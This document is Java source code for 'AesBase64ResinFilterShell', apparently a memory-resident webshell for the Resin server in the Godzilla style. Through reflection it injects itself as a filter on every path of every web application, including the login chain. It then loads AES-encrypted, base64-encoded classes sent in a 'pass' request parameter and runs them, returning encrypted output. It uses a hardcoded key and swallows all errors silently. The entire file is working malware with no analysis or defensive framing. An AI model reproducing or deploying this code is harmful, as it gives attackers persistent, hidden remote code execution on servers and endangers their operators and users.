import javax.servlet.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.*;
import java.util.*;


//3.0.8 - all
public class AesBase64ResinFilterShell extends ClassLoader implements Filter {
    private static boolean initialized = false;
    private static final Object lock = new Object();
    private static Class payloadClass;
    String key = "3c6e0b8a9c15224a";
    String password = "pass";


    static {
        new AesBase64ResinFilterShell();
    }

    public AesBase64ResinFilterShell(ClassLoader loader){
        super(loader);
    }

    public AesBase64ResinFilterShell(){
        synchronized (lock){
            if (!initialized){
                initialized = true;
                try {
                    addFilter(AesBase64ResinFilterShell.class);
                } catch (Throwable e) {

                }
            }
        }
    }



    private static Object[] getServers() throws Throwable {
        HashSet webapps = new HashSet();
        Class servletInvocationClass = loadClassEx("com.caucho.server.dispatch.ServletInvocation");
        Object contextRequest = servletInvocationClass.getMethod("getContextRequest").invoke(null);
        Object webApp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
        webapps.add(webApp);
        try {
            Object webAppContainer = webApp.getClass().getMethod("getParent").invoke(webApp);
            Object webappList = webAppContainer.getClass().getMethod("getWebAppList").invoke(webAppContainer);

            boolean isArray = false;

            int size = 0;

            if (webappList.getClass().isArray()){
                isArray = true;
                size = Array.getLength(webappList);
            }else {
                size = ((List)webappList).size();
            }

            for (int i = 0; i < size; i++) {
                try {
                    Object webAppController = null;

                    if (isArray){
                        webAppController = Array.get(webappList,i);
                    }else {
                        webAppController = ((List)webappList).get(i);
                    }

                    Object newWebApp = webAppController.getClass().getMethod("getWebApp").invoke(webAppController);
                    webapps.add(newWebApp);
                }catch (Throwable e){

                }
            }
        }catch (Throwable e){

        }



        return webapps.toArray();
    }

    private boolean addFilter(Class filterClass) throws Throwable {
        boolean isOk = false;
        try {
            Object[] obj = getServers();
            for (int i = 0; i < obj.length; i++) {
                Object webappContext = obj[i];
                try {
                    ClassLoader loader = Thread.currentThread().getContextClassLoader();
                    Class filterConfigImplClass = loader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
                    Class filterMappingClass = loader.loadClass("com.caucho.server.dispatch.FilterMapping");
                    String urlPattern   = "/*";
                    Object filterConfigImpl = filterMappingClass.newInstance();
                    getField(filterConfigImpl,"_filterClassName").set(filterConfigImpl,filterClass.getName());
                    getField(filterConfigImpl,"_filterClass").set(filterConfigImpl,filterClass);;
                    getField(filterConfigImpl,"_filterName").set(filterConfigImpl,filterClass.getName());;

                    Object filterConfigUrlPattern = filterMappingClass.getMethod("createUrlPattern").invoke(filterConfigImpl);
                    filterConfigUrlPattern.getClass().getMethod("addText",String.class).invoke(filterConfigUrlPattern,urlPattern);
                    filterConfigUrlPattern.getClass().getMethod("init").invoke(filterConfigUrlPattern);
                    getField(filterConfigImpl,"_servletContext").set(filterConfigImpl,webappContext);

                    try {
                        Object _filterMapper = getFieldValue(webappContext,"_filterMapper");
                        List _filterMapper_filterMap = (List) getFieldValue(_filterMapper,"_filterMap");
                        _filterMapper_filterMap.add(0,filterConfigImpl);
                    }catch (Exception e){}


                    try {
                        Object _loginFilterMapper = getFieldValue(webappContext,"_loginFilterMapper");
                        List _loginFilterMapper_filterMap = (List) getFieldValue(_loginFilterMapper,"_filterMap");
                        _loginFilterMapper_filterMap.add(0,filterConfigImpl);
                    }catch (Exception e){

                    }

                    webappContext.getClass().getMethod("addFilter",filterConfigImplClass).invoke(webappContext,filterConfigImpl);

                    webappContext.getClass().getMethod("clearCache").invoke(webappContext);
                    isOk = true;
                }catch (Throwable e) {

                }
            }
        } catch (Throwable e) {

        }


        return isOk;
    }



    public static Field getField(Object obj, String fieldName){
        Class clazz = null;

        if(obj == null){
            return null;
        }

        if (obj instanceof Class){
            clazz = (Class)obj;
        }else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz!=null){
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            }catch (Exception e){
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null){
            field.setAccessible(true);
        }

        return field;
    }

    private static Class loadClassEx(String className) throws ClassNotFoundException{
        try {
            return Class.forName(className);
        } catch (Throwable e) {
            try {
                return Class.forName(className, true, Thread.currentThread().getContextClassLoader());
            } catch (Throwable ignored) {
                try {
                    Thread[] threads = new Thread[Thread.activeCount()];
                    Thread.enumerate(threads);
                    for (int i = 0; i < threads.length; i++) {
                        Thread thread = threads[i];
                        if (thread == null) {
                            continue;
                        }
                        try {
                            ClassLoader loader = thread.getContextClassLoader();
                            return loader.loadClass(className);
                        } catch (Throwable ignored2) {

                        }

                    }

                } catch (Throwable ignored2) {

                }
            }

        }
        throw new ClassNotFoundException(className);
    }

    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f=null;
        if (obj instanceof Field){
            f=(Field)obj;
        }else {
            f = getField(obj, fieldName);
        }
        if (f != null) {
            return f.get(obj);
        }
        return null;
    }


    private byte[] aes(byte[] s,boolean m){
        try{
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(key.getBytes(),"AES"));
            return c.doFinal(s);
        }catch (Exception e){
            return null;
        }
    }

    private static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }

    private static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[] {
                    byte[].class
            }).invoke(Encoder, new Object[] {
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[] {
                        byte[].class
                }).invoke(Encoder, new Object[] {
                        bs
                });
            } catch (Exception e2) {}
        }
        return value;
    }
    private static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] {
                    String.class
            }).invoke(decoder, new Object[] {
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] {
                        String.class
                }).invoke(decoder, new Object[] {
                        bs
                });
            } catch (Exception e2) {}
        }
        return value;
    }



    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String contentType = servletRequest.getContentType();
        try {
            if (contentType!=null && contentType.contains("application/x-www-form-urlencoded")) {
                String value = servletRequest.getParameter(password);
                if (value!=null){
                    byte[] data = base64Decode(value);
                    data = aes(data, false);
                    if (data != null && data.length > 0){
                        if (payloadClass == null) {
                            ClassLoader loader = Thread.currentThread().getContextClassLoader();
                            if (loader == null) {
                                loader = servletRequest.getClass().getClassLoader();
                            }
                            payloadClass =  new AesBase64ResinFilterShell(loader).defineClass(data,0,data.length);
                        } else {
                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                            Object f = payloadClass.newInstance();
                            f.equals(arrOut);
                            f.equals(servletRequest);
                            f.equals(data);
                            f.toString();
                            String md5 = md5(password + key);
                            if (arrOut.size()>0) {
                                PrintWriter printWriter = servletResponse.getWriter();
                                printWriter.write(md5.substring(0, 16));
                                printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
                                printWriter.write(md5.substring(16));
                                return;
                            }
                        }
                    }
                }
            }
        }catch (Throwable e){

        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}
